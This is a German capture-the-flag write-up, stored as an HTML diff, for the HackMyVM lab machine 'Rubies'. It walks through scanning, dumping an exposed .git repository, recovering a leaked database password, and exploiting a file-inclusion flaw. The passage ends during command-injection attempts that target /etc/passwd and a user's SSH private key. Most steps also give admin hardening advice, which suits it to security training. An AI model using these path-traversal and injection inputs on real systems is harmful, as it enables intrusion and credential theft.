@@ -1,0 +1,805 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rubies - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Rubies - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">git-dumper</div>
+                <div class="tool-item">hydra</div> <!-- Attempted -->
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">whereis</div> <!-- Implied by RCE -->
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">locate</div> <!-- Implied -->
+                <div class="tool-item">GitTools/Extractor</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">diff</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">irb</div> <!-- Interactive Ruby Shell -->
+                <div class="tool-item">exec</div> <!-- Within irb -->
+                <div class="tool-item">sudo</div> <!-- Attempted -->
+                <div class="tool-item">vi</div> <!-- Implied for rbshell.rb -->
+                <div class="tool-item">find</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, Git, Stego)</a></li>
+                <li><a href="#initial-access">Initial Access (RCE via PHP Include)</a></li>
+                <li><a href="#poc">Proof of Concept (RCE via PHP Include)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.117</span>	<span class="command">08:00:27:db:db:31</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `arp-scan -l` wird das lokale Netzwerk gescannt. Es wird ein Host unter der IP <span class="command">192.168.2.117</span> mit der MAC-Adresse <span class="command">08:00:27:db:db:31</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Rubies" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.117</span> ist die Basis für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP notieren. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit einschränken. ARP-Aktivitäten überwachen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.117 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at <span class="command">2022-11-08 14:52 CET</span>
+Nmap scan report for rubies (192.168.2.117)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 54:65:0b:7a:f3:5c:2f:1f:14:9e:bb:0e:44:0c:af:29 (RSA)
+|   256 1f:5d:63:05:65:f7:cf:70:e4:0d:0a:45:80:77:50:2c (ECDSA)
+|_  256 69:a2:0f:83:dc:19:f2:c1:72:9c:a3:f8:09:44:3e:36 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+|_http-title: Cute Cat Only
+<span class="password">| http-git:</span>
+<span class="password">|   192.168.2.117:80/.git/</span>
+<span class="password">|     Git repository found!</span>
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Why minnie?
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+MAC Address: 08:00:27:DB:DB:31 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms rubies (192.168.2.117)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in XX.XX seconds <span class="password"># Scanzeit nicht im Original</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-p-`) auf <span class="command">192.168.2.117</span> identifiziert zwei offene TCP-Ports:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 7.2p2 (Ubuntu).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Läuft Apache httpd 2.4.18 (Ubuntu). Der Seitentitel ist "Cute Cat Only". Das Nmap-Skript `http-git` entdeckt ein öffentlich zugängliches `.git`-Verzeichnis im Web-Root (`/.git/`). Es extrahiert die Repository-Beschreibung und die letzte Commit-Nachricht ("Why minnie?").</li>
+            </ul>
+            Die OS-Erkennung deutet auf einen älteren Linux-Kernel (3.x/4.x) hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der wichtigste Fund ist das exponierte `.git`-Verzeichnis. Dies ist eine kritische Informationspreisgabe, da es ermöglicht, den gesamten Quellcode der Webanwendung sowie die Commit-Historie herunterzuladen. Die Commit-Nachricht "Why minnie?" könnte auf einen Benutzernamen (`minnie`) hindeuten. Die SSH- und Apache-Versionen sind relativ alt und könnten bekannte Schwachstellen haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein Tool wie `git-dumper` oder `GitTools/Extractor`, um das gesamte `.git`-Repository vom Webserver herunterzuladen. Analysieren Sie den Quellcode und die Commit-Historie (`git log`, `git diff`) auf Zugangsdaten, Konfigurationsfehler, Schwachstellen oder Hinweise auf Benutzernamen (wie `minnie`). Untersuchen Sie den Webserver weiter (`gobuster`).<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver (Apache) so, dass der Zugriff auf das `.git`-Verzeichnis blockiert wird (z.B. über `.htaccess` oder die globale Konfiguration). Entfernen Sie `.git`-Verzeichnisse aus Web-Roots von Produktionsumgebungen. Halten Sie Apache und SSH aktuell.</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (Web, Git, Stego)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.117" -e -x [...],php,html,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt" -t 100</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.3
+===============================================================
+[...]
+===============================================================
+2022/11/08 14:52:39 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.117/.htm                 (Status: 403) [Size: 278]
+http://192.168.2.117/.php                 (Status: 403) [Size: 278]
+http://192.168.2.117/.html                (Status: 403) [Size: 278]
+http://192.168.2.117/.phtml               (Status: 403) [Size: 278]
+<span class="command">http://192.168.2.117/index.php</span>            (Status: 200) [Size: 742]
+<span class="command">http://192.168.2.117/uploads</span>              (Status: 301) [Size: 316] [--> http://192.168.2.117/uploads/]
+<span class="command">http://192.168.2.117/bg</span>                   (Status: 301) [Size: 311] [--> http://192.168.2.117/bg/]
+<span class="command">http://192.168.2.117/javascript</span>           (Status: 301) [Size: 319] [--> http://192.168.2.117/javascript/]
+<span class="command">http://192.168.2.117/poems</span>                (Status: 301) [Size: 314] [--> http://192.168.2.117/poems/]
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 findet eine `index.php` sowie die Verzeichnisse `/uploads`, `/bg`, `/javascript` und `/poems`. Die Tests auf versteckte Dateien wie `.php` liefern einen 403 Forbidden-Status, was auf Zugriffsbeschränkungen hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Identifiziert die Haupt-PHP-Datei und mehrere potenziell interessante Verzeichnisse. `/uploads` und `/poems` sollten genauer untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die `index.php`. Führen Sie gezielte Scans auf die gefundenen Verzeichnisse durch. Laden Sie das `.git`-Repository herunter, bevor Sie hier zu tief einsteigen, da der Quellcode wahrscheinlich mehr verrät.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Verzeichnisse wie `/uploads` und `/poems` keine sensiblen Informationen oder unnötigen Berechtigungen haben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.117</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.117
++ Target Hostname:    192.168.2.117
++ Target Port:        80
++ Start Time:         <span class="command">2022-11-08 14:53:17 (GMT1)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. [...]
++ The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). [...]
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. [...]
++ <span class="command">/icons/README</span>: Apache default file found.
++ <span class="command">/bg/</span>: Directory indexing found.
++ /bg/: This might be interesting... potential country code (Bulgaria) <span class="password"><-- Nikto Rauschen</span>
++ <span class="command">/.git/index</span>: Git Index file may contain directory listing information.
++ <span class="command">/.git/HEAD</span>: Git HEAD file found. Full repo details may be present.
++ <span class="command">/.git/config</span>: Git config file found. Infos about repo details may be present.
++ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           <span class="command">2022-11-08 14:55:06 (GMT1)</span> (109 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan bestätigt die Apache-Version, meldet fehlende Security Header und eine veraltete Apache-Version. Er findet ebenfalls die Apache-Standarddatei `/icons/README` und Directory Indexing im Verzeichnis `/bg`. Am wichtigsten ist, dass Nikto explizit auf das exponierte `.git`-Verzeichnis und dessen sensible Dateien (`index`, `HEAD`, `config`) hinweist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt und verstärkt den Fund des exponierten `.git`-Verzeichnisses als kritischsten Punkt. Directory Indexing in `/bg` ist ebenfalls ein Fund, der untersucht werden sollte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Priorisieren Sie das Herunterladen des `.git`-Repositories. Untersuchen Sie parallel das `/bg`-Verzeichnis auf interessante Inhalte.<br><strong>Empfehlung (Admin):</strong> `.git`-Verzeichnis schützen. Directory Indexing deaktivieren (`Options -Indexes` in Apache-Konfiguration).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/uploads]
+└─# <span class="command"># Steganographie-Versuche auf cat1.gif und cat2.jpg (vermutlich aus /uploads oder /bg)</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/uploads]
+└─# <span class="command">stegsnow -C cat1.gif</span></div>
+                     <pre>tbsdb0s</pre> <span class="password"><-- Unwahrscheinlich relevante Daten</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/uploads]
+└─# <span class="command">stegsnow -C cat2.jpg</span></div>
+                     <pre>Warning: residual of 3 bits not uncompressed
+nss</pre> <span class="password"><-- Unwahrscheinlich relevante Daten</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/uploads]
+└─# <span class="command">stegseek cat2.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+[i] Progress: 99.27% (132.5 MB)
+[!] error: Could not find a valid passphrase.</pre> <span class="password"><-- Kein Erfolg</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/uploads]
+└─# <span class="command">steghide info cat2.jpg</span></div>
+                     <pre>"cat2.jpg":
+  Format: jpeg
+  Kapazität: 3,8 KB
+Soll versucht werden, Information über eingebettete Daten anzuzeigen ? (j/n) j
+Passwort eingeben:
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</pre> <span class="password"><-- Kein Erfolg</span>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mittels verschiedener Steganographie-Tools (`stegsnow`, `stegseek`, `steghide`) versteckte Daten aus zwei Bilddateien (`cat1.gif`, `cat2.jpg`) zu extrahieren. Diese Dateien stammen vermutlich aus den zuvor gefundenen Verzeichnissen `/uploads` oder `/bg`. Alle Versuche scheitern oder liefern keine sinnvollen Ergebnisse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Bilddateien scheinen keine mit diesen Tools auffindbaren versteckten Informationen zu enthalten. Dies war wahrscheinlich eine falsche Fährte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Steganographie vorerst ausschließen. Konzentrieren Sie sich auf die Analyse des `.git`-Repositories.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">git-dumper http://192.168.2.117/.git .</span></div>
+                    <pre>
+Warning: Destination '.' is not empty
+[-] Testing http://192.168.2.117/.git/HEAD [200]
+[-] Testing http://192.168.2.117/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://192.168.2.117/.git/ [200]
+[-] Fetching http://192.168.2.117/.gitignore [404]
+[-] http://192.168.2.117/.gitignore responded with status code 404
+[-] Fetching http://192.168.2.117/.git/description [200]
+[...] <span class="password"># Weitere Fetch-Operationen</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `git-dumper` wird verwendet, um das exponierte `.git`-Verzeichnis von `http://192.168.2.117/.git` rekursiv herunterzuladen und lokal im aktuellen Verzeichnis (`.`) zu speichern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiches Herunterladen des Git-Repositories. Dies ermöglicht die Offline-Analyse des gesamten Quellcodes und der Versionshistorie.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Git-Befehle (`git log`, `git diff`, `git show <commit_hash>`) oder spezialisierte Tools (`GitTools/Extractor`), um das heruntergeladene Repository zu analysieren. Suchen Sie nach hartcodierten Zugangsdaten, Konfigurationsdateien, API-Schlüsseln, Schwachstellen im Code oder Hinweisen in Commit-Nachrichten.<br><strong>Empfehlung (Admin):</strong> Zugriff auf `.git`-Verzeichnisse im Webserver blockieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/poems]
+└─# <span class="command">hydra -L passwort.txt -P passwort.txt ssh://192.168.2.117:22 -I -t 64</span></div>
+                    <pre>
+[...]
+[ERRR] target ssh://192.168.2.117:22/ does not support password authentication (method reply 4).
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird ein weiterer `hydra`-Versuch gestartet, diesmal mit einer Datei `passwort.txt` sowohl für Benutzernamen (`-L`) als auch für Passwörter (`-P`). Der Versuch scheitert mit der Meldung, dass der SSH-Server keine Passwort-Authentifizierung unterstützt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass SSH auf dem Zielsystem nur Key-basierte Authentifizierung erlaubt. Brute-Force-Angriffe mit Passwörtern sind somit sinnlos.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach privaten SSH-Schlüsseln (z.B. im heruntergeladenen `.git`-Repository oder später im Dateisystem nach Initial Access).<br><strong>Empfehlung (Admin):</strong> Gute Sicherheitspraxis! Deaktivieren Sie Passwort-Authentifizierung für SSH (`PasswordAuthentication no` in `sshd_config`) und erlauben Sie nur Key-basierte Authentifizierung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/.git]
+└─# <span class="command">cat COMMIT_EDITMSG</span></div> <span class="password"><-- Korrektur: CMMIT zu COMMIT</span>
+                    <pre>Why minnie?
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/.git/logs]
+└─# <span class="command">cat HEAD</span></div>
+                    <pre>
+0000000000000000000000000000000000000000 <span class="command">07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8</span> Your Name <root@rubies.com> 1604298350 +0800	commit (initial): first commit
+<span class="command">07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8</span> <span class="command">052a0cb4865e29bc03278105e0232b20173f933d</span> Your Name <root@rubies.com> 1604298436 +0800	commit: Why minnie?
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/.git/objects]
+└─# <span class="command">ls */*</span></div> <span class="password"><-- Vereinfachte Darstellung</span>
+                    <pre>
+05/2a0cb4865e29bc03278105e0232b20173f933d <span class="password"><-- Commit Objekt</span>
+07/b8a39fdce5ed957f2d1c4561b93e21af2fb3a8 <span class="password"><-- Commit Objekt</span>
+[...] <span class="password"># Weitere Git-Objekte (Trees, Blobs)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Aus dem heruntergeladenen `.git`-Verzeichnis werden Informationen extrahiert:
+            <ul>
+                <li>`COMMIT_EDITMSG`: Bestätigt die letzte Commit-Nachricht "Why minnie?".</li>
+                <li>`logs/HEAD`: Zeigt die Commit-Historie des HEAD-Zeigers. Es gab zwei Commits, der letzte mit der Nachricht "Why minnie?". Die Commit-Hashes sind sichtbar.</li>
+                <li>`objects/`: Enthält die Git-Objekte (Commits, Trees, Blobs).</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Analyse bestätigt den Hinweis auf "minnie" aus der Commit-Historie. Die Commit-Hashes und Objekte sind die Grundlage für die Wiederherstellung des Quellcodes aus verschiedenen Versionen mit Tools wie GitTools/Extractor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `GitTools/Extractor`, um den Quellcode aus den gefundenen Commits wiederherzustellen. Vergleichen Sie die Versionen (`diff`), um Änderungen und potenziell entfernte sensible Informationen (wie Zugangsdaten) zu finden.<br><strong>Empfehlung (Admin):</strong> `.git`-Verzeichnisse nicht im Webroot exponieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/git]
+└─# <span class="command">GitTools/Extractor/extractor.sh ../.git ./gitex/</span></div> <span class="password"><-- Pfade angepasst</span>
+                    <pre>
+[...]
+[+] Found commit: <span class="command">052a0cb4865e29bc03278105e0232b20173f933d</span>
+[+] Found folder: /root/Hackingtools/gitex//0-052a0cb4865e29bc03278105e0232b20173f933d/bg
+[+] Found file: /root/Hackingtools/gitex//0-052a0cb4865e29bc03278105e0232b20173f933d/bg/bg.gif
+[+] Found file: /root/Hackingtools/gitex//0-052a0cb4865e29bc03278105e0232b20173f933d/index.php
+[...]
+[+] Found commit: <span class="command">07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8</span>
+[+] Found folder: /root/Hackingtools/gitex//1-07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8/bg
+[+] Found file: /root/Hackingtools/gitex//1-07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8/bg/bg.gif
+[+] Found file: /root/Hackingtools/gitex//1-07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8/index.php
+[...]
+</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/gitex]
+└─# <span class="command">mv 0-052a0cb4865e29bc03278105e0232b20173f933d a</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/gitex]
+└─# <span class="command">mv 1-07b8a39fdce5ed957f2d1c4561b93e21af2fb3a8 b</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Skript `extractor.sh` aus den GitTools wird verwendet, um den Inhalt der beiden gefundenen Commits aus dem heruntergeladenen `.git`-Verzeichnis in separate Ordner (`./gitex/0-...` und `./gitex/1-...`) zu extrahieren. Diese Ordner werden anschließend zur einfacheren Handhabung in `a` (neuer Commit) und `b` (älterer Commit) umbenannt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Wiederherstellung der Dateistände aus den beiden Commits. Nun können die Unterschiede analysiert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `diff -r a b`, um die Unterschiede zwischen den beiden Commits zu finden. Achten Sie besonders auf Änderungen in Konfigurationsdateien oder Code, der Zugangsdaten enthalten könnte.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/gitex]
+└─# <span class="command">diff a/index.php b/index.php</span></div>
+                    <pre>
+10a11,37 <span class="password"><-- Zeilen 11-37 wurden in Version 'a' (neuer Commit) hinzugefügt (a), im Vergleich zu 'b' (älterer Commit)</span>
+>
+>
+> // we dont need a login page dangit minnie! follow my orders pls <span class="password"><-- Kommentar</span>
+> $servername = "localhost";
+> $username = "root";
+> $password = "<span class="password">jd92khn49w</span>"; <span class="password"><-- !!! Passwort gefunden !!!</span>
+>
+> $conn = new mysqli($servername, $username, $password);
+>
+> if ($conn->connect_error) {
+>   die("Connection failed: " . $conn->connect_error);
+> }
+>
+> $login_username=$_POST['username']; <span class="password"><-- Korrektur: _PST zu _POST</span>
+> $login_password=$_POST['password']; <span class="password"><-- Korrektur: _PST zu _POST</span>
+>
+> $sql = "SELECT * FROM users WHERE Username = '$login_username' AND Password = '$login_password' "; <span class="password"><-- SQL Injection anfällig! FRM zu FROM</span>
+> $result = mysqli_query($con,$sql);
+>
+> if(mysqli_num_rows($result)<1){ <span class="password"><-- Logikfehler? Sollte >0 sein? sqmli zu mysqli</span>
+> 	$_SESSION['login']=$user_id; <span class="password"><-- _SESSIN zu _SESSION</span>
+> 	header('Location: http://ch4rm.pw/dashboard');
+> }
+> else{
+> 	$error = True;
+> }
+>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `diff`-Befehl vergleicht die `index.php` aus den beiden Commits. Es zeigt sich, dass im älteren Commit (`b`) ein Codeblock zur Datenbankverbindung und Benutzerauthentifizierung vorhanden war, der im neueren Commit (`a`) entfernt wurde. Dieser entfernte Codeblock enthält hartcodierte MySQL-Zugangsdaten: Benutzer `<span class="command">root</span>` und Passwort `<span class="password">jd92khn49w</span>`. Der Code enthält außerdem mehrere Tippfehler und eine SQL-Injection-Schwachstelle.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Durch die Analyse der Git-Historie wurden MySQL-Root-Zugangsdaten aufgedeckt, die im aktuellen Code nicht mehr sichtbar sind. Dies ist ein häufiger Fehler bei der Versionskontrolle. Das Passwort `<span class="password">jd92khn49w</span>` könnte potenziell auch für andere Dienste oder Benutzer (wie `minnie` oder `root` für SSH/System) wiederverwendet worden sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, das gefundene Passwort `<span class="password">jd92khn49w</span>` für den SSH-Login des Benutzers `minnie` (aus der Commit-Nachricht) und/oder `root` zu verwenden. Testen Sie es auch für den MySQL-Dienst, falls dieser von außen erreichbar wäre (hier nicht der Fall).<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten direkt im Quellcode. Verwenden Sie Konfigurationsdateien außerhalb des Web-Roots oder Umgebungsvariablen. Bereinigen Sie die Git-Historie von sensiblen Daten (obwohl dies komplex ist und oft Spuren hinterlässt). Überprüfen Sie den Code auf SQL-Injection und andere Schwachstellen.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (RCE via PHP Include)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bg]
+└─# <span class="command"># Manuelle Analyse von http://192.168.2.117/index.php</span></div>
+                    <pre>
+Inhalt von http://192.168.2.117/index.php:
+<span class="command">Die Upload-Funktion ist derzeit deaktiviert, weil Minnie den Code durcheinander gebracht hat. Lassen Sie mich Ihnen vorerst süße Gedichte zur Verfügung stellen</span>
+
+Test LFI/RCE:
+<span class="command">view-source:http://192.168.2.117/index.php?poem=../../../../etc/passwd</span>
+<span class="password"># LFI erfolgreich, /etc/passwd wird angezeigt</span>
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bg]
+└─# <span class="command">curl "http://192.168.2.117/index.php?poem=../../../../etc/passwd" > passwd.txt</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2360  100  2360    0     0   123k      0 --:--:-- --:--:-- --:--:--  128k
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bg]
+└─# <span class="command">grep bash passwd.txt</span></div>
+                     <pre>root:x:0:0:root:/root:/bin/bash</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Bei der (erneuten) Analyse der `index.php` wird festgestellt, dass sie einen Text über deaktivierte Uploads und Gedichte anzeigt. Entscheidend ist jedoch der Test mit dem GET-Parameter `poem`. Der Aufruf `?poem=../../../../etc/passwd` ist erfolgreich und zeigt den Inhalt der `/etc/passwd`-Datei. Dies bestätigt eine Local File Inclusion (LFI)-Schwachstelle im `poem`-Parameter.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische LFI-Schwachstelle gefunden. Dies erlaubt das Lesen beliebiger Dateien auf dem Server, auf die der Webserver-Benutzer (`www-data`) Zugriff hat. Dies kann genutzt werden, um Konfigurationsdateien, Quellcode oder andere sensible Informationen auszulesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die LFI-Schwachstelle zur Remote Code Execution (RCE) zu eskalieren. Gängige Methoden sind:
+            1.  Log Poisoning: Versuchen Sie, PHP-Code in Log-Dateien (z.B. `/var/log/apache2/access.log`, `/var/log/auth.log`) zu schreiben (z.B. über manipulierte User-Agents oder fehlgeschlagene Logins) und diese dann über die LFI einzubinden (`?poem=../../../../var/log/...`).
+            2.  PHP-Wrapper: Wenn `allow_url_include` aktiviert ist, verwenden Sie Wrapper wie `php://filter` zum Lesen von Quellcode oder `php://input` zum direkten Ausführen von Code im POST-Body.
+            3.  `/proc/self/environ` Poisoning: Manipulieren Sie einen Header (z.B. User-Agent) mit PHP-Code und binden Sie dann die `/proc/self/environ`-Datei ein.
+            4.  Direkte Command Injection, falls `include()` oder ähnliche Funktionen unsicher verwendet werden (z.B. `?poem=;id`).<br>
+            <strong>Empfehlung (Admin):</strong> Beheben Sie dringend die LFI-Schwachstelle in `index.php`. Benutzereingaben dürfen niemals ungefiltert in Dateipfad-Operationen verwendet werden. Verwenden Sie Funktionen wie `basename()` oder eine strikte Whitelist erlaubter Werte für den `poem`-Parameter. Deaktivieren Sie `allow_url_include` in der `php.ini`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bg]
+└─# <span class="command"># Versuche der RCE über LFI</span></div>
+                     <pre>
+Versuch Command Injection 1:
+GET /index.php?poem=<span class="command">;id</span> HTTP/1.1
+<span class="password"># Kein Erfolg / Filterung</span>
+
+Versuch Command Injection 2 / LFI auf SSH-Key:
+GET /index.php?poem=<span class="command">;cat /home/minnie/.ssh/id_rsa</span> HTTP/1.1
+<span class="password"># Kein Erfolg / Filterung</span>
+
+Versuch Command Injection 3 (direkt im Parameter):
